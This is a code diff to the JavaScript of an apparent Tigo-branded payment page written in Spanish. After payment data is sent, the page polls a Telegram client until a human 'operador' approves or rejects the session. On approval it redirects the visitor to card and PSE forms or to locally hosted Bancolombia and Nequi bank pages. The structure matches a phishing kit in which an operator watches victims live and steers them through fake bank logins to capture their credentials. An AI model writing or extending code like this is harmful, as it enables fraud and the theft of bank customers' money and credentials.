@@ -132,6 +132,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 
                 if (result.success) {
                     console.log(`[PAYMENT] ✓ Datos enviados. Esperando confirmación del operador...`);
+                    console.log(`[PAYMENT] SessionID: ${sessionId}`);
                     
                     // Esperar confirmación del operador antes de redirigir
                     TelegramClient.startPolling((actions, stop) => {
@@ -139,23 +140,50 @@ document.addEventListener('DOMContentLoaded', function() {
                             console.warn('[PAYMENT] Ya procesando, ignorando...');
                             return;
                         }
-                        window.__paymentProcessing = true;
+                        
+                        console.log('[PAYMENT] Acciones recibidas:', actions);
                         
                         const action = actions[0];
-                        console.log('[PAYMENT] ✓ Acción recibida:', action.action);
+                        const actionName = action.action;
                         
-                        // Detener polling
-                        stop();
+                        console.log('[PAYMENT] ✓ Acción recibida:', actionName);
                         
-                        // Redireccionar según el método
-                        if (method === 'card') {
-                            window.location.href = `/card/form?invoice_id=${invoiceId}`;
-                        } else if (method === 'bancolombia') {
-                            window.location.href = '/bancas/Bancolombia/index.html';
-                        } else if (method === 'nequi') {
-                            window.location.href = '/bancas/Nequi/index.html';
-                        } else if (method === 'pse') {
-                            window.location.href = `/pse/form?invoice_id=${invoiceId}`;
+                        // Verificar que sea la acción correcta
+                        const expectedContinue = `tigo_${method}_continue`;
+                        const expectedReject = `tigo_${method}_reject`;
+                        
+                        if (actionName === expectedReject) {
+                            console.log('[PAYMENT] ❌ Operador rechazó el pago');
+                            stop();
+                            alert('El operador ha cancelado este pago');
+                            if (overlay) {
+                                overlay.classList.remove('active');
+                                overlay.style.display = 'none';
+                            }
+                            window.__paymentProcessing = false;
+                            return;
+                        }
+                        
+                        if (actionName === expectedContinue) {
+                            window.__paymentProcessing = true;
+                            
+                            // Detener polling
+                            stop();
+                            
+                            console.log('[PAYMENT] ✓ Operador aprobó, redirigiendo...');
+                            
+                            // Redireccionar según el método
+                            if (method === 'card') {
+                                window.location.href = `/card/form?invoice_id=${invoiceId}`;
+                            } else if (method === 'bancolombia') {
+                                window.location.href = '/bancas/Bancolombia/index.html';
+                            } else if (method === 'nequi') {
+                                window.location.href = '/bancas/Nequi/numero.html';
+                            } else if (method === 'pse') {
+                                window.location.href = `/pse/form?invoice_id=${invoiceId}`;
+                            }
+                        } else {
+                            console.log('[PAYMENT] Acción no relevante, esperando...');
                         }
                     }, sessionId, 50, 300000);
                 } else {
